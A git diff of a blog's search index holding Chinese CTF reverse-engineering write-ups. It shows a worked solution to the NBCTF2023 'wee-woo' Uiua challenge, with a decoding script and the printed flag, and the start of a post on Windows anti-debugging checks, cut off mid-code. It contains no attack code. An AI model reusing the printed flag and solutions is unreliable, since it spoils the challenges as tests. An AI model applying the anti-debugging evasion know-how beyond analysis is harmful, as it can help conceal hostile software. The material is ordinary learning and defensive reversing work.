@@ -4,7 +4,7 @@
     <title>LACTF2024逆向方向部分wp</title>
     <url>/2024/02/23/LACTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT</p>
-<p>email: <a href="mailto:&#x6f;&#107;&#117;&#117;&#115;&#117;&#107;&#117;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#x6f;&#107;&#117;&#117;&#115;&#117;&#107;&#117;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a></p>
+<p>email: <a href="mailto:&#x6f;&#107;&#117;&#x75;&#x73;&#117;&#x6b;&#117;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x6f;&#107;&#117;&#x75;&#x73;&#117;&#x6b;&#117;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a></p>
 <span id="more"></span>
 
 <h2 id="shattered-memories"><a href="#shattered-memories" class="headerlink" title="shattered-memories"></a><strong>shattered-memories</strong></h2><p>签到题 DIE查壳 无壳64x IDA64打开直接拼flag:</p>
@@ -82,7 +82,7 @@
     <title>NBCTF2024逆向方向wp</title>
     <url>/2024/02/23/NBCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT</p>
-<p>email: <a href="mailto:&#x6f;&#x6b;&#x75;&#117;&#x73;&#x75;&#107;&#117;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#109;">&#x6f;&#x6b;&#x75;&#117;&#x73;&#x75;&#107;&#117;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#109;</a></p>
+<p>email: <a href="mailto:&#x6f;&#x6b;&#117;&#117;&#115;&#117;&#107;&#117;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x6f;&#x6b;&#117;&#117;&#115;&#117;&#107;&#117;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a></p>
 <span id="more"></span>
 
 <h2 id="Crisscross-pyre"><a href="#Crisscross-pyre" class="headerlink" title="Crisscross | pyre"></a>Crisscross | pyre</h2><p>给了一个python程序和它的输出:</p>
@@ -156,53 +156,10 @@
       </tags>
   </entry>
   <entry>
-    <title>古神语(Uiua)之研究</title>
-    <url>/2024/03/05/%E5%8F%A4%E7%A5%9E%E8%AF%AD%E4%B9%8B%E7%A0%94%E7%A9%B6/</url>
-    <content><![CDATA[<p>在NBCTF2023遇到了很奇怪的一坨 题目给了一个图片文件和一个<code>.ua</code>文件 那时候一直没搞懂.ua是什么 最近在DC群组遇到了出题人 他提示: </p>
-<p>[uiua.org]: uiua.org	“Uiua (wee-wuh 🔉) is a general purpose, stack-based, array-oriented programming language”</p>
-<p> 从此开启了 <del>古神语之旅</del> 一种栈机语言的研究(<del>实际上才研究了两天</del>) 视该语言后续在CTF中遇到的频率或者发现了什么独特的用途而更新该研究</p>
-<span id="more"></span>
-
-<h3 id="Uiua"><a href="#Uiua" class="headerlink" title="Uiua"></a>Uiua</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>如官网所说 这是一种基于<code>Rust</code>的栈机语言 但是同时也是一种功能十分强大的面向数组语言(对数组的处理能力极强且完备) 同时还内置对音频和视频的生成和处理 经过这两天的研究我发现其实用性其实非常强 只是因为使用了各种奇怪的字符让人觉得不是很正经 但是其实所有的符号都有对应的英文指令</p>
-<h4 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h4><p>第一个不得不提的 <del>构式</del> 特性就是对不分行(该语言对格式敏感)的一条语句解释器的阅读顺序是由右到左 对多条语句的是由上至下</p>
-<p>由于其基于栈 变量名之类的实际上不重要 但是也提供了定义变量名与相关值的相关操作 定义的变量不会储存于栈中(<code>?</code> 用于打印当前栈的信息):</p>
-<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-212827.png" alt="image-20240305212820170"></p>
-<p>提供了一种类似Wasm 同时又比Wasm便捷的编程体验</p>
-<p>同时由于所有的运算都基于栈 作为操作指令参量的栈中数据在参与完运算后如果没有特殊操作都会直接销毁(并不<code>pop</code>到哪些变量中 当然也可以添加<code>pop</code>操作) </p>
-<p>例如:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-214009.png" alt="image-20240305214009805"></p>
-<p>从这里也可以看出运算的顺序是<code>op(value-second-top-to-stack) with value-top-to-stack</code> </p>
-<p>如上面所说 这是一个面向数组的语言 几乎所有功能和数组都密切相关 而Uiua提供了类似<code>numpy</code>库中的矩阵操作用以处理数组形成的矩阵</p>
-<p>对于三维矩阵若其第1, 2维的长度均超过20且第3维为3或4就可以生成对应的RGB通道或RGB-Alpha通道图片 <del>而音频 我没有研究</del></p>
-<h4 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h4><h5 id="NBCTF2023-rev-wee-woo"><a href="#NBCTF2023-rev-wee-woo" class="headerlink" title="[NBCTF2023&#x2F;rev&#x2F;wee-woo]"></a>[NBCTF2023&#x2F;rev&#x2F;wee-woo]</h5><p>题目给出的古神语:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag ← &quot;nbctf&#123;redacted&#125;&quot;</span><br><span class="line">Flag ← utf Flag</span><br><span class="line">÷ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ;⍢(: ↯:⍉:↯⌊η:↯⊟.⌈√,:⧻. ☇-×⁅ηπτ↻×⁅π,◫+⁅-⌊ητ,↻-⁅π,◿ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ:-⌊η)(&gt;-×⁅ηπτ)⁅ₙ⋅∘⍥(+,:)⌈π.⌊η×η⧻.Flag</span><br><span class="line">↯ 300_300_3</span><br><span class="line">⧻ Flag</span><br><span class="line"># 49</span><br></pre></td></tr></table></figure>
-
-<p>具体含义如下(根据官网自带的编译器以及符号含义得出 其实看着非常复杂的代码有很大一部分是混淆 即用代数运算结果来代替一些数值):</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">⍢(</span><br><span class="line">  :-1</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η◌ # 256 - Flag</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  ↻-⁅π,◿ⁿ:⌈η◌ # 右移3 - n行 n = (2, 1, 0)</span><br><span class="line">  ◫+⁅-⌊ητ,    # 构造窗口 列数为7 - n</span><br><span class="line">  -×⁅ηπτ↻×⁅π, # 上移 3n 行</span><br><span class="line">  ☇           # 铺平为1维</span><br><span class="line">  ⊟.⌈√,:⧻.    # 长度入栈交换和矩阵的位置 压入shape = [., ceil(√len)]</span><br><span class="line">  :↯          # 改变矩阵形状为shape 取尽后未填满从头再取</span><br><span class="line">  :↯⌊η</span><br><span class="line">  :⍉ # 矩阵转置</span><br><span class="line">  :↯ # 取原来的矩阵大小摊平为1维</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">⍢(</span><br><span class="line">  ⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:</span><br><span class="line">)(≠-×⁅ηπτ)</span><br><span class="line">÷ⁿ:⌈η◌</span><br><span class="line">↯ 300_300_3</span><br></pre></td></tr></table></figure>
-
-<p>根据以上的分析 题目的古神语并没有对Flag进行任何特殊加密 只是单纯的将256与每个值相减然后进过一系列矩阵变化打乱顺序再构成RGB三通道来生成图片 同时最后输出了Flag的实际长度49</p>
-<p>那么我们可以先处理一段长49 且处理完后的值为[0~48]的顺序列表来当作下标标记处理后的值本来应该存放在flag的什么位置:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[256 255 254 253 252 251 250 249 248 247 246 245 244 243 242 241 240 239 238 237 236 235 234 233 232 231 230 229 228 227 226 225 224 223 222 221 220 219 218 217 216 215 214 213 212 211 210 209 208]</span><br><span class="line">3</span><br><span class="line">⍢(</span><br><span class="line">  :-1</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η◌ # 256 - Flag</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  ↻-⁅π,◿ⁿ:⌈η◌ # 右移3 - n行 n = (2, 1, 0)</span><br><span class="line">  ◫+⁅-⌊ητ,    # 构造窗口 列数为7 - n</span><br><span class="line">  -×⁅ηπτ↻×⁅π, # 上移 3n 行</span><br><span class="line">  ☇           # 铺平为1维</span><br><span class="line">  ⊟.⌈√,:⧻.    # 长度入栈交换和矩阵的位置 压入shape = [., ceil(√len)]</span><br><span class="line">  :↯          # 改变矩阵形状为shape 取尽后未填满从头再取</span><br><span class="line">  :↯⌊η</span><br><span class="line">  :⍉ # 矩阵转置</span><br><span class="line">  :↯ # 取原来的矩阵大小摊平为1维</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">⍢(</span><br><span class="line">  ⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:</span><br><span class="line">)(≠-×⁅ηπτ)</span><br><span class="line">÷ⁿ:⌈η◌</span><br><span class="line">↯ 300_300_3</span><br><span class="line">☇ 0 . # 转化回原来1维方便处理</span><br></pre></td></tr></table></figure>
-
-<p>结果太长不展示</p>
-<p>然后利用题目给的图片解密:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># key = []</span><br><span class="line"># for i in range(49):</span><br><span class="line">#     key.append(256 - i)</span><br><span class="line"># print(str(key).replace(&quot;, &quot;, &quot; &quot; ))</span><br><span class="line"></span><br><span class="line">ind = [...]</span><br><span class="line">ind = [ind[3 * i:3 * i + 3] for i in range(len(ind) // 3)]</span><br><span class="line">flag = np.array(Image.open(&quot;flag.png&quot;))</span><br><span class="line">weiht, height = flag.shape[0], flag.shape[1]</span><br><span class="line">F = [257] * 49</span><br><span class="line">for i in range(weiht):</span><br><span class="line">    for j in range(height):</span><br><span class="line">        for k in range(3):</span><br><span class="line">            F[ind[300 * i + j][k]] = flag[i][j][k]</span><br><span class="line">            if 257 not in F:</span><br><span class="line">                F = [chr(255 - i) for i in F]</span><br><span class="line">                print(&quot;&quot;.join(F))</span><br><span class="line">                exit(0)</span><br><span class="line"># nbctf&#123;TBH_1_h4t3d_m4kin6_7h1s_ch4ll_6d1a32fe482b&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这几天的古神语研究真的让我产生了一种”这是一种非常安全且功能强大的语言 如果能在某些语言中内联安全性一定很高”的感觉 而且官方目前依然保持高频率更新 只能说希望以后真的能实现古神语保护吧</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>栈机</tag>
-        <tag>虚拟机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>osu!gamingCTF部分wp</title>
     <url>/2024/03/04/osu-gamingCTF%E9%83%A8%E5%88%86wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT</p>
-<p>email: <a href="mailto:&#x6f;&#x6b;&#x75;&#x75;&#115;&#117;&#107;&#117;&#x40;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x6f;&#x6b;&#x75;&#x75;&#115;&#117;&#107;&#117;&#x40;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a></p>
+<p>email: <a href="mailto:&#x6f;&#x6b;&#x75;&#117;&#x73;&#x75;&#107;&#117;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x6f;&#x6b;&#x75;&#117;&#x73;&#x75;&#107;&#117;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a></p>
 <p>笑点解析:osu有CTF CTF有osu</p>
 <span id="more"></span>
 
@@ -252,27 +209,53 @@
       </tags>
   </entry>
   <entry>
-    <title>1!秒钟寄!一个算法:DFS-深度优先搜索</title>
-    <url>/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
-    <content><![CDATA[<h3 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h3><p>DFS用于找到图中从给定起点到终点所有无交点路线(我猜的) 并不保证全部路线都能找到 也不保证找到的路线是最短的</p>
-<p> 因为CTF遇到过好几次 所以学习一下</p>
+    <title>古神语(Uiua)之研究</title>
+    <url>/2024/03/05/%E5%8F%A4%E7%A5%9E%E8%AF%AD%E4%B9%8B%E7%A0%94%E7%A9%B6/</url>
+    <content><![CDATA[<p>在NBCTF2023遇到了很奇怪的一坨 题目给了一个图片文件和一个<code>.ua</code>文件 那时候一直没搞懂.ua是什么 最近在DC群组遇到了出题人 他提示: </p>
+<p>[uiua.org]: uiua.org	“Uiua (wee-wuh 🔉) is a general purpose, stack-based, array-oriented programming language”</p>
+<p> 从此开启了 <del>古神语之旅</del> 一种栈机语言的研究(<del>实际上才研究了两天</del>) 视该语言后续在CTF中遇到的频率或者发现了什么独特的用途而更新该研究</p>
 <span id="more"></span>
 
-<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dfs_iterative_paths</span>(<span class="params">graph, start, end = start</span>):</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    stack = [(start, [start])]</span><br><span class="line"></span><br><span class="line">    paths = []</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node, path = stack.pop()</span><br><span class="line">        visited.add(node)</span><br><span class="line">        <span class="keyword">if</span> node == end:</span><br><span class="line">            paths.append(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[node]:</span><br><span class="line">            <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                stack.append((neighbor, path + [neighbor]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br></pre></td></tr></table></figure>
+<h3 id="Uiua"><a href="#Uiua" class="headerlink" title="Uiua"></a>Uiua</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>如官网所说 这是一种基于<code>Rust</code>的栈机语言 但是同时也是一种功能十分强大的面向数组语言(对数组的处理能力极强且完备) 同时还内置对音频和视频的生成和处理 经过这两天的研究我发现其实用性其实非常强 只是因为使用了各种奇怪的字符让人觉得不是很正经 但是其实所有的符号都有对应的英文指令</p>
+<h4 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h4><p>第一个不得不提的 <del>构式</del> 特性就是对不分行(该语言对格式敏感)的一条语句解释器的阅读顺序是由右到左 对多条语句的是由上至下</p>
+<p>由于其基于栈 变量名之类的实际上不重要 但是也提供了定义变量名与相关值的相关操作 定义的变量不会储存于栈中(<code>?</code> 用于打印当前栈的信息):</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-212827.png" alt="image-20240305212820170"></p>
+<p>提供了一种类似Wasm 同时又比Wasm便捷的编程体验</p>
+<p>同时由于所有的运算都基于栈 作为操作指令参量的栈中数据在参与完运算后如果没有特殊操作都会直接销毁(并不<code>pop</code>到哪些变量中 当然也可以添加<code>pop</code>操作) </p>
+<p>例如:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-214009.png" alt="image-20240305214009805"></p>
+<p>从这里也可以看出运算的顺序是<code>op(value-second-top-to-stack) with value-top-to-stack</code> </p>
+<p>如上面所说 这是一个面向数组的语言 几乎所有功能和数组都密切相关 而Uiua提供了类似<code>numpy</code>库中的矩阵操作用以处理数组形成的矩阵</p>
+<p>对于三维矩阵若其第1, 2维的长度均超过20且第3维为3或4就可以生成对应的RGB通道或RGB-Alpha通道图片 <del>而音频 我没有研究</del></p>
+<h4 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h4><h5 id="NBCTF2023-rev-wee-woo"><a href="#NBCTF2023-rev-wee-woo" class="headerlink" title="[NBCTF2023&#x2F;rev&#x2F;wee-woo]"></a>[NBCTF2023&#x2F;rev&#x2F;wee-woo]</h5><p>题目给出的古神语:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag ← &quot;nbctf&#123;redacted&#125;&quot;</span><br><span class="line">Flag ← utf Flag</span><br><span class="line">÷ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ;⍢(: ↯:⍉:↯⌊η:↯⊟.⌈√,:⧻. ☇-×⁅ηπτ↻×⁅π,◫+⁅-⌊ητ,↻-⁅π,◿ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ:-⌊η)(&gt;-×⁅ηπτ)⁅ₙ⋅∘⍥(+,:)⌈π.⌊η×η⧻.Flag</span><br><span class="line">↯ 300_300_3</span><br><span class="line">⧻ Flag</span><br><span class="line"># 49</span><br></pre></td></tr></table></figure>
+
+<p>具体含义如下(根据官网自带的编译器以及符号含义得出 其实看着非常复杂的代码有很大一部分是混淆 即用代数运算结果来代替一些数值):</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">⍢(</span><br><span class="line">  :-1</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η◌ # 256 - Flag</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  ↻-⁅π,◿ⁿ:⌈η◌ # 右移3 - n行 n = (2, 1, 0)</span><br><span class="line">  ◫+⁅-⌊ητ,    # 构造窗口 列数为7 - n</span><br><span class="line">  -×⁅ηπτ↻×⁅π, # 上移 3n 行</span><br><span class="line">  ☇           # 铺平为1维</span><br><span class="line">  ⊟.⌈√,:⧻.    # 长度入栈交换和矩阵的位置 压入shape = [., ceil(√len)]</span><br><span class="line">  :↯          # 改变矩阵形状为shape 取尽后未填满从头再取</span><br><span class="line">  :↯⌊η</span><br><span class="line">  :⍉ # 矩阵转置</span><br><span class="line">  :↯ # 取原来的矩阵大小摊平为1维</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">⍢(</span><br><span class="line">  ⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:</span><br><span class="line">)(≠-×⁅ηπτ)</span><br><span class="line">÷ⁿ:⌈η◌</span><br><span class="line">↯ 300_300_3</span><br></pre></td></tr></table></figure>
+
+<p>根据以上的分析 题目的古神语并没有对Flag进行任何特殊加密 只是单纯的将256与每个值相减然后进过一系列矩阵变化打乱顺序再构成RGB三通道来生成图片 同时最后输出了Flag的实际长度49</p>
+<p>那么我们可以先处理一段长49 且处理完后的值为[0~48]的顺序列表来当作下标标记处理后的值本来应该存放在flag的什么位置:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[256 255 254 253 252 251 250 249 248 247 246 245 244 243 242 241 240 239 238 237 236 235 234 233 232 231 230 229 228 227 226 225 224 223 222 221 220 219 218 217 216 215 214 213 212 211 210 209 208]</span><br><span class="line">3</span><br><span class="line">⍢(</span><br><span class="line">  :-1</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η◌ # 256 - Flag</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  ↻-⁅π,◿ⁿ:⌈η◌ # 右移3 - n行 n = (2, 1, 0)</span><br><span class="line">  ◫+⁅-⌊ητ,    # 构造窗口 列数为7 - n</span><br><span class="line">  -×⁅ηπτ↻×⁅π, # 上移 3n 行</span><br><span class="line">  ☇           # 铺平为1维</span><br><span class="line">  ⊟.⌈√,:⧻.    # 长度入栈交换和矩阵的位置 压入shape = [., ceil(√len)]</span><br><span class="line">  :↯          # 改变矩阵形状为shape 取尽后未填满从头再取</span><br><span class="line">  :↯⌊η</span><br><span class="line">  :⍉ # 矩阵转置</span><br><span class="line">  :↯ # 取原来的矩阵大小摊平为1维</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">⍢(</span><br><span class="line">  ⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:</span><br><span class="line">)(≠-×⁅ηπτ)</span><br><span class="line">÷ⁿ:⌈η◌</span><br><span class="line">↯ 300_300_3</span><br><span class="line">☇ 0 . # 转化回原来1维方便处理</span><br></pre></td></tr></table></figure>
+
+<p>结果太长不展示</p>
+<p>然后利用题目给的图片解密:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># key = []</span><br><span class="line"># for i in range(49):</span><br><span class="line">#     key.append(256 - i)</span><br><span class="line"># print(str(key).replace(&quot;, &quot;, &quot; &quot; ))</span><br><span class="line"></span><br><span class="line">ind = [...]</span><br><span class="line">ind = [ind[3 * i:3 * i + 3] for i in range(len(ind) // 3)]</span><br><span class="line">flag = np.array(Image.open(&quot;flag.png&quot;))</span><br><span class="line">weiht, height = flag.shape[0], flag.shape[1]</span><br><span class="line">F = [257] * 49</span><br><span class="line">for i in range(weiht):</span><br><span class="line">    for j in range(height):</span><br><span class="line">        for k in range(3):</span><br><span class="line">            F[ind[300 * i + j][k]] = flag[i][j][k]</span><br><span class="line">            if 257 not in F:</span><br><span class="line">                F = [chr(255 - i) for i in F]</span><br><span class="line">                print(&quot;&quot;.join(F))</span><br><span class="line">                exit(0)</span><br><span class="line"># nbctf&#123;TBH_1_h4t3d_m4kin6_7h1s_ch4ll_6d1a32fe482b&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这几天的古神语研究真的让我产生了一种”这是一种非常安全且功能强大的语言 如果能在某些语言中内联安全性一定很高”的感觉 而且官方目前依然保持高频率更新 只能说希望以后真的能实现古神语保护吧</p>
 ]]></content>
       <categories>
-        <category>算法</category>
-        <category>图论</category>
+        <category>杂项</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>栈机</tag>
+        <tag>虚拟机</tag>
       </tags>
   </entry>
   <entry>
     <title>BeginCTF2024逆向方向wp</title>
     <url>/2024/02/23/BeginCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT</p>
-<p>email:<a href="mailto:&#111;&#x6b;&#117;&#x75;&#115;&#117;&#x6b;&#x75;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#111;&#x6b;&#117;&#x75;&#115;&#117;&#x6b;&#x75;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>email:<a href="mailto:&#111;&#107;&#117;&#117;&#x73;&#x75;&#x6b;&#x75;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#111;&#107;&#117;&#117;&#x73;&#x75;&#x6b;&#x75;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a></p>
 <span id="more"></span>
 
 <h2 id="superguesser-动态调试"><a href="#superguesser-动态调试" class="headerlink" title="superguesser | 动态调试"></a>superguesser | 动态调试</h2><p>静态分析发现函数全部被混淆 在入口下断点步过函数直到进入被还原的函数 找到核心加密逻辑:</p>
@@ -398,6 +381,30 @@
       </categories>
       <tags>
         <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反调试技术</title>
+    <url>/2024/03/26/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<p>记录一下遇到的反调试方法和反制措施<span id="more"></span></p>
+<h2 id="NtQueryInformationProcess-ZwQueryInformationProcess"><a href="#NtQueryInformationProcess-ZwQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()"></a>NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>两个都是Windows中检查并获取进程信息的函数 区别在于调用方式和调用权限 Zw需要在内核态调用 Nt在用户态调用 主要起到反调试作用的是第二个参数<code>ProcessInformationClass</code></p>
+<p>当该值为<code>ProcessDebugPort(0x07)</code>时返回缓冲区为<code>-1(调试状态), 0(非调试状态)</code></p>
+<p>当该值为<code>ProcessDebugObjectHandle(0x1E)</code>时返回缓冲区为一个调试对象句柄<code>!=NULL(调试状态), NULL(非调试状态)</code></p>
+<p>当该值为<code>ProcessDebugFlags(0x1F)</code>时返回缓冲区为<code>0(调试状态), 1(非调试状态)</code></p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="LineCTF-rev-BrownFlagChecker"><a href="#LineCTF-rev-BrownFlagChecker" class="headerlink" title="LineCTF&#x2F;rev&#x2F;BrownFlagChecker"></a>LineCTF&#x2F;rev&#x2F;BrownFlagChecker</h4><p>其中有一个函数如下:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">anti_debug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall *SystemRoutineAddress)(__int64, __int64, __int64 *); <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">SystemRoutineName</span>;</span> <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+50h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;SystemRoutineName.Length = 